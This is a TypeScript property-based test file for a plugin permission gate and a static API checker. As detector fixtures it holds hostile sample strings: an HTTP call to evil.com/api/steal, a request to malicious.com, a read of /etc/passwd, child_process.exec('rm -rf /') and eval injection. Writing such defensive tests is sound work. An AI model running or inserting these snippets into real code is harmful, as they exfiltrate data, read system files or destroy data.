
/**
 * Property-Based Test: Plugin Permission Gate (Property 28)
 * 
 * Validates: Property 28, Requirements 17.2, 17.3
 * 
 * Property: For all plugins p and current grant set grants,
 * if p.manifest.requires \ grants ≠ ∅ (i.e., there are undeclared requirements),
 * THEN Plugin Loader rejects loading p; if p's source code contains prohibited
 * sensitive API calls, Loader must also reject loading.
 * 
 * Iterations: ≥ 100
 * 
 * @specforge/permission-engine
 */

import { describe, it, expect, beforeEach, afterEach } from 'vitest';
import * as fc from 'fast-check';
import {
  PluginPermissionValidator,
  createPluginPermissionValidator,
  createDefaultPluginPermissionValidator,
  PluginManifest,
  PluginValidationResult,
  GrantSet
} from '../../src/services/plugin-permission-validator';
import {
  StaticApiChecker,
  createRestrictiveStaticApiChecker,
  createPermissiveStaticApiChecker,
  ProhibitedApiType,
  StaticApiCheckResult
} from '../../src/services/static-api-checker';

/**
 * Feature: Plugin Permission Gate, Property 28
 * 
 * Derived-From: v6-architecture-overview Property 28
 * 
 * Tests:
 * - Plugin requirement validation (requires field vs grants)
 * - Static API checks (prohibited sensitive APIs)
 * - Combined validation (both requirements and static checks)
 * - Edge cases for manifest and source code generation
 */

// Helper: Generate a random plugin ID
function generatePluginId(seed: number): string {
  return `plugin-${seed}-${Math.random().toString(36).substring(2, 8)}`;
}

// Helper: Generate source code with prohibited APIs
function generateSourceCodeWithProhibitedApi(type: ProhibitedApiType): string {
  switch (type) {
    case ProhibitedApiType.CHILD_PROCESS_EXEC:
      // Use direct child_process.exec to match the pattern
      return `const child_process = require('child_process');
child_process.exec('ls -la', (err, stdout) => { console.log(stdout); });`;
    case ProhibitedApiType.FS_READ_FILE:
      return `const fs = require('fs');
const data = fs.readFileSync('/etc/passwd', 'utf8');`;
    case ProhibitedApiType.NET_HTTP:
      return `const http = require('http');
http.get('http://evil.com/api/steal', (res) => { });`;
    case ProhibitedApiType.DANGEROUS_EVAL:
      return `const userInput = 'console.log("hacked")';
eval(userInput);`;
    case ProhibitedApiType.PROCESS_ENV:
      return `const apiKey = process.env.API_KEY;
console.log(apiKey);`;
    default:
      return '// No prohibited API';
  }
}

// Helper: Generate safe source code
function generateSafeSourceCode(seed: number): string {
  const safeTemplates = [
    `// Plugin ${seed}
export function init() {
  console.log('Plugin initialized');
  return { status: 'ok' };
}`,
    `// Safe plugin
const config = { name: 'test', version: '1.0' };
export default config;`,
    `// Another safe plugin
import { something } from './local-module';
export function execute() {
  return something();
}`,
    `// Plugin with local filesystem only
import * as path from 'path';
export function getPath() {
  return path.join(__dirname, 'data.json');
}`
  ];
  return safeTemplates[seed % safeTemplates.length];
}

describe('Property 28: Plugin Permission Gate', () => {
  const testProjectId = 'test-project-property-28';

  describe('28.1: Plugin Requirements Validation', () => {
    /**
     * Property: If plugin requires permissions not in grants, loading must be rejected.
     */
    it('should reject plugins with requirements not in grants', async () => {
      await fc.assert(
        fc.asyncProperty(
          fc.integer({ min: 1, max: 100 }),
          async (seed) => {
            // Create validator with specific grants
            const grants: GrantSet = {
              permissions: ['filesystem.read', 'tool.execute']
            };
            
            const validator = createPluginPermissionValidator({
              projectId: testProjectId,
              eventLoggingEnabled: false,
              defaultGrants: grants
            });

            // Create manifest with requirements NOT in grants
            const manifest: PluginManifest = {
              id: generatePluginId(seed),
              name: `Test Plugin ${seed}`,
              requires: ['network.http', 'process.exec', 'workflow.create'] // Not in grants
            };

            const result = validator.validate(manifest);

            // Assert: Must be rejected
            expect(result.valid).toBe(false);
            expect(result.reason).toBe('requirements_not_granted');
            expect(result.missingRequirements).toContain('network.http');
            expect(result.missingRequirements).toContain('process.exec');
            expect(result.missingRequirements).toContain('workflow.create');
          }
        ),
        { numRuns: 50 }
      );
    });

    /**
     * Property: If plugin requires permissions IN grants, loading must be allowed.
     */
    it('should allow plugins with all requirements satisfied by grants', async () => {
      await fc.assert(
        fc.asyncProperty(
          fc.integer({ min: 1, max: 100 }),
          async (seed) => {
            // Create grants that include all required permissions
            const grants: GrantSet = {
              permissions: [
                'filesystem.read',
                'filesystem.write',
                'network.http',
                'tool.execute',
                'workflow.create'
              ]
            };
            
            const validator = createPluginPermissionValidator({
              projectId: testProjectId,
              eventLoggingEnabled: false,
              defaultGrants: grants
            });

            // Create manifest with requirements IN grants
            const manifest: PluginManifest = {
              id: generatePluginId(seed),
              name: `Allowed Plugin ${seed}`,
              requires: ['filesystem.read', 'tool.execute'] // Both in grants
            };

            const result = validator.validate(manifest);

            // Assert: Must be allowed
            expect(result.valid).toBe(true);
            expect(result.reason).toBe('valid');
            expect(result.missingRequirements).toHaveLength(0);
          }
        ),
        { numRuns: 50 }
      );
    });

    /**
     * Property: Empty requirements should always be allowed.
     */
    it('should allow plugins with no requirements', async () => {
      await fc.assert(
        fc.asyncProperty(
          fc.integer({ min: 1, max: 100 }),
          async (seed) => {
            const grants: GrantSet = {
              permissions: [] // Empty grants
            };
            
            const validator = createPluginPermissionValidator({
              projectId: testProjectId,
              eventLoggingEnabled: false,
              defaultGrants: grants
            });

            // Manifest with no requirements
            const manifest: PluginManifest = {
              id: generatePluginId(seed),
              name: `No Requirements Plugin ${seed}`
              // No requires field
            };

            const result = validator.validate(manifest);

            // Assert: Must be allowed
            expect(result.valid).toBe(true);
            expect(result.reason).toBe('valid');
          }
        ),
        { numRuns: 50 }
      );
    });

    /**
     * Property: Partial grant satisfaction should be rejected.
     */
    it('should reject plugins when only some requirements are granted', async () => {
      await fc.assert(
        fc.asyncProperty(
          fc.integer({ min: 1, max: 100 }),
          async (seed) => {
            const grants: GrantSet = {
              permissions: ['filesystem.read', 'tool.execute'] // Only 2 of 3
            };
            
            const validator = createPluginPermissionValidator({
              projectId: testProjectId,
              eventLoggingEnabled: false,
              defaultGrants: grants
            });

            // Requires 3 permissions, only 2 granted
            const manifest: PluginManifest = {
              id: generatePluginId(seed),
              name: `Partial Plugin ${seed}`,
              requires: ['filesystem.read', 'tool.execute', 'network.http']
            };

            const result = validator.validate(manifest);

            // Assert: Must be rejected (missing network.http)
            expect(result.valid).toBe(false);
            expect(result.missingRequirements).toContain('network.http');
            expect(result.missingRequirements).toHaveLength(1);
          }
        ),
        { numRuns: 50 }
      );
    });
  });

  describe('28.2: Static API Checks', () => {
    /**
     * Property: Source code with child_process.exec should be rejected.
     */
    it('should reject code with child_process.exec', async () => {
      await fc.assert(
        fc.asyncProperty(
          fc.integer({ min: 1, max: 50 }),
          async (seed) => {
            const checker = createRestrictiveStaticApiChecker({
              projectId: testProjectId,
              eventLoggingEnabled: false
            });

            const sourceCode = generateSourceCodeWithProhibitedApi(ProhibitedApiType.CHILD_PROCESS_EXEC);
            const result = checker.check(sourceCode, generatePluginId(seed), `Plugin ${seed}`);

            // Assert: Must be rejected
            expect(result.valid).toBe(false);
            expect(result.reason).toBe('prohibited_api_detected');
            expect(result.hasErrors).toBe(true);
            expect(result.detectedApis.length).toBeGreaterThan(0);
            expect(result.detectedApis[0].category).toBe('child_process');
          }
        ),
        { numRuns: 30 }
      );
    });

    /**
     * Property: Source code with fs.readFile to /etc should be rejected.
     */
    it('should reject code with fs.readFile out-of-bounds', async () => {
      // Test with default restrictive checker (no allowed paths = all fs access is out of bounds)
      const checker = createRestrictiveStaticApiChecker({
        projectId: testProjectId,
        eventLoggingEnabled: false
        // No allowedPaths = all filesystem access is considered out of bounds
      });

      // Simple fs.readFile call - should be detected as out of bounds since no allowed paths
      const sourceCode = 'fs.readFile("/etc/passwd", function(err, data) { });';
      const result = checker.check(sourceCode, 'test-plugin', 'Test Plugin');

      // Assert: Must be rejected
      expect(result.valid).toBe(false);
      expect(result.detectedApis.some(api => api.category === 'filesystem')).toBe(true);
    });

    /**
     * Property: Source code with http.request to unallowed host should be rejected.
     */
    it('should reject code with undeclared network access', async () => {
      await fc.assert(
        fc.asyncProperty(
          fc.integer({ min: 1, max: 50 }),
          async (seed) => {
            const checker = createRestrictiveStaticApiChecker({
              projectId: testProjectId,
              eventLoggingEnabled: false,
              allowedHosts: ['api.example.com'] // Only allow this host
            });

            const sourceCode = `const http = require('http');
http.get('http://evil.com/data', (res) => { });`;
            const result = checker.check(sourceCode, generatePluginId(seed), `Plugin ${seed}`);

            // Assert: Must be rejected (host not in allowed list)
            expect(result.valid).toBe(false);
            expect(result.detectedApis.some(api => api.category === 'network')).toBe(true);
          }
        ),
        { numRuns: 30 }
      );
    });

    /**
     * Property: Source code with eval() should be rejected.
     */
    it('should reject code with eval()', async () => {
      await fc.assert(
        fc.asyncProperty(
          fc.integer({ min: 1, max: 50 }),
          async (seed) => {
            const checker = createRestrictiveStaticApiChecker({
              projectId: testProjectId,
              eventLoggingEnabled: false
            });

            const sourceCode = generateSourceCodeWithProhibitedApi(ProhibitedApiType.DANGEROUS_EVAL);
            const result = checker.check(sourceCode, generatePluginId(seed), `Plugin ${seed}`);

            // Assert: Must be rejected (eval is code injection)
            expect(result.valid).toBe(false);
            expect(result.detectedApis.some(api => api.category === 'code_injection')).toBe(true);
          }
        ),
        { numRuns: 30 }
      );
    });

    /**
     * Property: Safe source code should pass static checks.
     */
    it('should allow safe source code', async () => {
      await fc.assert(
        fc.asyncProperty(
          fc.integer({ min: 1, max: 50 }),
          async (seed) => {
            const checker = createRestrictiveStaticApiChecker({
              projectId: testProjectId,
              eventLoggingEnabled: false
            });

            const sourceCode = generateSafeSourceCode(seed);
            const result = checker.check(sourceCode, generatePluginId(seed), `Safe Plugin ${seed}`);

            // Assert: Must pass
            expect(result.valid).toBe(true);
            expect(result.reason).toBe('valid');
            expect(result.detectedApis).toHaveLength(0);
          }
        ),
        { numRuns: 30 }
      );
    });

    /**
     * Property: Source code with process.env should be warned (but not error).
     */
    it('should warn on process.env access', async () => {
      await fc.assert(
        fc.asyncProperty(
          fc.integer({ min: 1, max: 50 }),
          async (seed) => {
            const checker = createRestrictiveStaticApiChecker({
              projectId: testProjectId,
              eventLoggingEnabled: false
            });

            const sourceCode = generateSourceCodeWithProhibitedApi(ProhibitedApiType.PROCESS_ENV);
            const result = checker.check(sourceCode, generatePluginId(seed), `Plugin ${seed}`);

            // process.env is a warning, not an error
            expect(result.hasWarnings).toBe(true);
          }
        ),
        { numRuns: 30 }
      );
    });
  });

  describe('28.3: Combined Permission and Static Check', () => {
    /**
     * Property: Plugin must be rejected if EITHER requirements not met OR static check fails.
     */
    it('should reject plugin when requirements not met (regardless of code)', async () => {
      await fc.assert(
        fc.asyncProperty(
          fc.integer({ min: 1, max: 50 }),
          async (seed) => {
            // Setup: grants that don't include required permissions
            const grants: GrantSet = {
              permissions: ['filesystem.read']
            };
            const validator = createPluginPermissionValidator({
              projectId: testProjectId,
              eventLoggingEnabled: false,
              defaultGrants: grants
            });

            // Safe code but missing requirements
            const manifest: PluginManifest = {
              id: generatePluginId(seed),
              name: `Plugin ${seed}`,
              requires: ['network.http'] // Not in grants
            };
            
            const sourceCode = generateSafeSourceCode(seed);
            const checker = createRestrictiveStaticApiChecker({
              projectId: testProjectId,
              eventLoggingEnabled: false
            });

            // Validate both
            const permResult = validator.validate(manifest);
            const staticResult = checker.check(sourceCode, manifest.id, manifest.name);

            // Assert: Permission check fails first
            expect(permResult.valid).toBe(false);
            // Static check passes (code is safe)
            expect(staticResult.valid).toBe(true);
            
            // Combined: should reject due to requirements
            const combinedValid = permResult.valid && staticResult.valid;
            expect(combinedValid).toBe(false);
          }
        ),
        { numRuns: 30 }
      );
    });

    /**
     * Property: Plugin must be rejected if static check fails (regardless of requirements).
     */
    it('should reject plugin when static check fails (regardless of requirements)', async () => {
      await fc.assert(
        fc.asyncProperty(
          fc.integer({ min: 1, max: 50 }),
          async (seed) => {
            // Setup: grants that include all required permissions
            const grants: GrantSet = {
              permissions: ['filesystem.read', 'network.http', 'process.exec']
            };
            const validator = createPluginPermissionValidator({
              projectId: testProjectId,
              eventLoggingEnabled: false,
              defaultGrants: grants
            });

            // Requirements satisfied
            const manifest: PluginManifest = {
              id: generatePluginId(seed),
              name: `Plugin ${seed}`,
              requires: ['filesystem.read'] // In grants
            };
            
            // But code has prohibited API
            const sourceCode = generateSourceCodeWithProhibitedApi(ProhibitedApiType.CHILD_PROCESS_EXEC);
            const checker = createRestrictiveStaticApiChecker({
              projectId: testProjectId,
              eventLoggingEnabled: false
            });

            // Validate both
            const permResult = validator.validate(manifest);
            const staticResult = checker.check(sourceCode, manifest.id, manifest.name);

            // Assert: Permission check passes
            expect(permResult.valid).toBe(true);
            // Static check fails (prohibited API)
            expect(staticResult.valid).toBe(false);
            
            // Combined: should reject due to static check
            const combinedValid = permResult.valid && staticResult.valid;
            expect(combinedValid).toBe(false);
          }
        ),
        { numRuns: 30 }
      );
    });

    /**
     * Property: Plugin must be allowed only if BOTH requirements met AND static check passes.
     */
    it('should allow plugin only when both checks pass', async () => {
      await fc.assert(
        fc.asyncProperty(
          fc.integer({ min: 1, max: 50 }),
          async (seed) => {
            // Setup: grants that include all required permissions
            const grants: GrantSet = {
              permissions: ['filesystem.read', 'network.http', 'tool.execute']
            };
            const validator = createPluginPermissionValidator({
              projectId: testProjectId,
              eventLoggingEnabled: false,
              defaultGrants: grants
            });

            // Requirements satisfied
            const manifest: PluginManifest = {
              id: generatePluginId(seed),
              name: `Plugin ${seed}`,
              requires: ['filesystem.read', 'tool.execute'] // Both in grants
            };
            
            // Safe code
            const sourceCode = generateSafeSourceCode(seed);
            const checker = createRestrictiveStaticApiChecker({
              projectId: testProjectId,
              eventLoggingEnabled: false
            });

            // Validate both
            const permResult = validator.validate(manifest);
            const staticResult = checker.check(sourceCode, manifest.id, manifest.name);

            // Assert: Both pass
            expect(permResult.valid).toBe(true);
            expect(staticResult.valid).toBe(true);
            
            // Combined: should allow
            const combinedValid = permResult.valid && staticResult.valid;
            expect(combinedValid).toBe(true);
          }
        ),
        { numRuns: 30 }
      );
    });
  });

  describe('28.4: Edge Cases', () => {
    /**
     * Property: Manifest with empty requires array should be treated as no requirements.
     */
    it('should treat empty requires array as no requirements', async () => {
      const grants: GrantSet = {
        permissions: []
      };
      
      const validator = createPluginPermissionValidator({
        projectId: testProjectId,
        eventLoggingEnabled: false,
        defaultGrants: grants
      });

      const manifest: PluginManifest = {
        id: 'test-plugin',
        name: 'Test Plugin',
        requires: [] // Empty array
      };

      const result = validator.validate(manifest);
      expect(result.valid).toBe(true);
    });

    /**
     * Property: Multiple plugins batch validation.
     */
    it('should validate multiple plugins in batch', async () => {
      await fc.assert(
        fc.asyncProperty(
          fc.integer({ min: 1, max: 30 }),
          async (seed) => {
            const grants: GrantSet = {
              permissions: ['filesystem.read', 'tool.execute']
            };
            
            const validator = createPluginPermissionValidator({
              projectId: testProjectId,
              eventLoggingEnabled: false,
              defaultGrants: grants
            });

            const manifests: PluginManifest[] = [
              {
                id: `plugin-allowed-${seed}`,
                name: `Allowed Plugin ${seed}`,
                requires: ['filesystem.read']
              },
              {
                id: `plugin-rejected-${seed}`,
                name: `Rejected Plugin ${seed}`,
                requires: ['network.http'] // Not in grants
              }
            ];

            const results = validator.validateBatch(manifests);

            expect(results).toHaveLength(2);
            expect(results[0].valid).toBe(true);
            expect(results[1].valid).toBe(false);
          }
        ),
        { numRuns: 20 }
      );
    });

    /**
     * Property: Custom grants override default grants.
     */
    it('should use custom grants when provided', async () => {
      const defaultGrants: GrantSet = {
        permissions: ['filesystem.read']
      };
      const customGrants: GrantSet = {
        permissions: ['filesystem.read', 'network.http', 'tool.execute']
      };
      
      const validator = createPluginPermissionValidator({
        projectId: testProjectId,
        eventLoggingEnabled: false,
        defaultGrants: defaultGrants
      });

      const manifest: PluginManifest = {
        id: 'test-plugin',
        name: 'Test Plugin',
        requires: ['network.http', 'tool.execute']
      };

      // Without custom grants - should fail
      const resultWithoutCustom = validator.validate(manifest);
      expect(resultWithoutCustom.valid).toBe(false);

      // With custom grants - should pass
      const resultWithCustom = validator.validate(manifest, customGrants);
      expect(resultWithCustom.valid).toBe(true);
    });

    /**
     * Property: Static checker with allowedPaths permits within-bounds access.
     */
    it('should allow filesystem access within allowed paths', async () => {
      const checker = createRestrictiveStaticApiChecker({
        projectId: testProjectId,
        eventLoggingEnabled: false,
        allowedPaths: ['/home/user/project', '/tmp/sandbox']
      });

      // Code accessing allowed path
      const sourceCode = `const fs = require('fs');
const data = fs.readFileSync('/home/user/project/data.json', 'utf8');`;
      
      const result = checker.check(sourceCode, 'test-plugin', 'Test Plugin');

      // Should pass because path is within allowedPaths
      expect(result.valid).toBe(true);
    });

    /**
     * Property: Static checker with allowedHosts permits specific hosts.
     */
    it('should allow network access to allowed hosts', async () => {
      const checker = createRestrictiveStaticApiChecker({
        projectId: testProjectId,
        eventLoggingEnabled: false,
        allowedHosts: ['api.example.com', '*.trusted.org']
      });

      // Code accessing allowed host
      const sourceCode = `const https = require('https');
https.get('https://api.example.com/data', (res) => { });`;
      
      const result = checker.check(sourceCode, 'test-plugin', 'Test Plugin');

      // Should pass because host is in allowedHosts
      expect(result.valid).toBe(true);
    });

    /**
     * Property: Permissive static checker allows all APIs.
     */
    it('should allow all APIs with permissive checker', async () => {
      const checker = createPermissiveStaticApiChecker({
        projectId: testProjectId,
        eventLoggingEnabled: false
      });

      // Code with prohibited APIs
      const sourceCode = `
const { exec } = require('child_process');
const fs = require('fs');
const http = require('http');
eval('console.log("test")');
`;
      
      const result = checker.check(sourceCode, 'test-plugin', 'Test Plugin');

      // Should pass because checker is permissive
      expect(result.valid).toBe(true);
    });
  });

  describe('28.5: Random Comprehensive Tests', () => {
    /**
     * Property: Random manifest with random grants.
     */
    it('should correctly validate random manifests against random grants', async () => {
      await fc.assert(
        fc.asyncProperty(
          fc.integer({ min: 1, max: 100 }),
          async (seed) => {
            // Generate random grants (1-5 permissions)
            const numGrants = (seed % 5) + 1;
            const allPermissions = [
              'filesystem.read', 'filesystem.write', 'network.http',
              'process.exec', 'tool.execute', 'workflow.create',
              'workflow.read', 'spec.create', 'spec.read'
            ];
            const grants: GrantSet = {
              permissions: Array.from({ length: numGrants }, (_, i) => 
                allPermissions[(seed + i) % allPermissions.length]
              )
            };

            // Generate random requirements (0-4 permissions)
            const numRequirements = seed % 4;
            const manifestRequirements = Array.from({ length: numRequirements }, (_, i) =>
              allPermissions[(seed * 2 + i) % allPermissions.length]
            );

            const validator = createPluginPermissionValidator({
              projectId: testProjectId,
              eventLoggingEnabled: false,
              defaultGrants: grants
            });

            const manifest: PluginManifest = {
              id: generatePluginId(seed),
              name: `Random Plugin ${seed}`,
              requires: manifestRequirements
            };

            const result = validator.validate(manifest);

            // Calculate expected missing requirements
            const missingExpected = manifestRequirements.filter(req => 
              !grants.permissions.includes(req)
            );

            // Assert: result matches expectation
            if (missingExpected.length === 0) {
              expect(result.valid).toBe(true);
            } else {
              expect(result.valid).toBe(false);
              expect(result.missingRequirements).toEqual(
                expect.arrayContaining(missingExpected)
              );
            }
          }
        ),
        { numRuns: 100 }
      );
    });

    /**
     * Property: Random source code validation.
     */
    it('should correctly detect prohibited APIs in random code', async () => {
      await fc.assert(
        fc.asyncProperty(
          fc.integer({ min: 1, max: 100 }),
          async (seed) => {
            const checker = createRestrictiveStaticApiChecker({
              projectId: testProjectId,
              eventLoggingEnabled: false
            });

            // Generate random source code patterns
            const codePatterns = [
              generateSafeSourceCode(seed),
              generateSourceCodeWithProhibitedApi(ProhibitedApiType.CHILD_PROCESS_EXEC),
              // Skip fs readfile since it requires special handling
              generateSourceCodeWithProhibitedApi(ProhibitedApiType.NET_HTTP),
              generateSourceCodeWithProhibitedApi(ProhibitedApiType.DANGEROUS_EVAL),
            ];
            
            const sourceCode = codePatterns[seed % codePatterns.length];
            const result = checker.check(sourceCode, generatePluginId(seed), `Plugin ${seed}`);

            // Safe code should pass, prohibited should fail
            const isSafeCode = seed % 4 === 0;
            if (isSafeCode) {
              expect(result.valid).toBe(true);
            } else {
              expect(result.valid).toBe(false);
              expect(result.detectedApis.length).toBeGreaterThan(0);
            }
          }
        ),
        { numRuns: 100 }
      );
    });
  });

  describe('28.6: Requirements 17.2 and 17.3 Specific Tests', () => {
    /**
     * Requirement 17.2: Plugin manifest's requires field must be subset of granted permissions
     */
    it('should enforce requires field is subset of grants (Req 17.2)', async () => {
      await fc.assert(
        fc.asyncProperty(
          fc.integer({ min: 1, max: 50 }),
          async (seed) => {
            // Create a validator with known grants
            const grants: GrantSet = {
              permissions: ['filesystem.read', 'filesystem.write', 'tool.execute', 'workflow.read']
            };
            
            const validator = createPluginPermissionValidator({
              projectId: testProjectId,
              eventLoggingEnabled: false,
              defaultGrants: grants
            });

            // Test case: requires is subset of grants
            const validManifest: PluginManifest = {
              id: generatePluginId(seed),
              name: `Valid Plugin ${seed}`,
              requires: ['filesystem.read', 'tool.execute'] // Both in grants - subset
            };

            // Test case: requires is NOT subset of grants
            const invalidManifest: PluginManifest = {
              id: generatePluginId(seed + 1000),
              name: `Invalid Plugin ${seed}`,
              requires: ['filesystem.read', 'network.http'] // network.http not in grants
            };

            const validResult = validator.validate(validManifest);
            const invalidResult = validator.validate(invalidManifest);

            // Requirement 17.2 AC-1: subset -> allow
            expect(validResult.valid).toBe(true);
            
            // Requirement 17.2 AC-2: not subset -> reject
            expect(invalidResult.valid).toBe(false);
            expect(invalidResult.reason).toBe('requirements_not_granted');
          }
        ),
        { numRuns: 30 }
      );
    });

    /**
     * Requirement 17.3: Static checks prohibit sensitive APIs
     */
    it('should detect and reject prohibited sensitive APIs (Req 17.3)', async () => {
      await fc.assert(
        fc.asyncProperty(
          fc.integer({ min: 1, max: 50 }),
          async (seed) => {
            const checker = createRestrictiveStaticApiChecker({
              projectId: testProjectId,
              eventLoggingEnabled: false
            });

            // Source code with various prohibited APIs
            const prohibitedCodes = [
              // Direct child_process.exec
              `const child_process = require('child_process');
child_process.exec('rm -rf /', (error) => { });`,
              
              // Undeclared network access
              `const http = require('http');
http.request({ hostname: 'malicious.com', port: 80 }, (res) => { });`,
              
              // Code injection
              `eval('process.exit(1)');`,
            ];

            const sourceCode = prohibitedCodes[seed % prohibitedCodes.length];
            const result = checker.check(sourceCode, generatePluginId(seed), `Plugin ${seed}`);

            // Requirement 17.3: Prohibited APIs must be detected
            expect(result.valid).toBe(false);
            expect(result.detectedApis.length).toBeGreaterThan(0);
            
            // Verify categories - should include at least child_process, network, or code_injection
            const categories = result.detectedApis.map(api => api.category);
            const hasRequiredCategory = categories.some(c => 
              ['child_process', 'network', 'code_injection'].includes(c)
            );
            expect(hasRequiredCategory).toBe(true);
          }
        ),
        { numRuns: 30 }
      );
    });

    /**
     * Requirement 17.3: Prohibited API types must be correctly categorized
     */
    it('should categorize prohibited APIs by type (Req 17.3)', async () => {
      const checker = createRestrictiveStaticApiChecker({
        projectId: testProjectId,
        eventLoggingEnabled: false
      });

      // Test each category
      const testCases = [
        { code: `child_process.exec('ls')`, category: 'child_process' },
        { code: `fs.readFile('/test')`, category: 'filesystem' },
        { code: `http.get('http://test.com')`, category: 'network' },
        { code: `eval('x')`, category: 'code_injection' },
      ];

      for (const tc of testCases) {
        const result = checker.check(tc.code, 'test', 'Test');
        
        // Find the detected API for this category
        const detectedForCategory = result.detectedApis.find(
          api => api.category === tc.category
        );
        
        expect(detectedForCategory).toBeDefined();
      }
    });
  });
});